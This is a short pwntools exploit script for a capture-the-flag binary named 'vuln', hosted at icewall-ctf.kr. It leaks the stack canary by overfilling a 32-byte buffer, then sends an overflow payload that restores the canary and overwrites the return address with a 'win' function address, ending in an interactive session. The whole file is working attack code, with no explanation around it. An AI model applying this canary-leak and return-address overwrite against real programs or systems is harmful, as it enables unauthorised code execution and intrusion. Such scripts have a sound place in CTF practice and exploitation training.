from pwn import *
import sys

if len(sys.argv) == 1 :
	p = process('./vuln')
else :
	p = connect('icewall-ctf.kr', 10202)

win = 0x804869B

p.sendlineafter('>', '1')
p.sendline('A'*32)

p.sendlineafter('>', '2')
leak = p.recv(36)
leak = '\x00'+leak[33:36]

print 'Canary = '+''.join('%02X ' % ord(b) for b in leak)

p.sendline('1')
payload = 'A'*32
payload += leak
payload += 'A'*12
payload += p32(win)

p.sendline(payload)

p.sendlineafter('>', '3')

p.interactive()
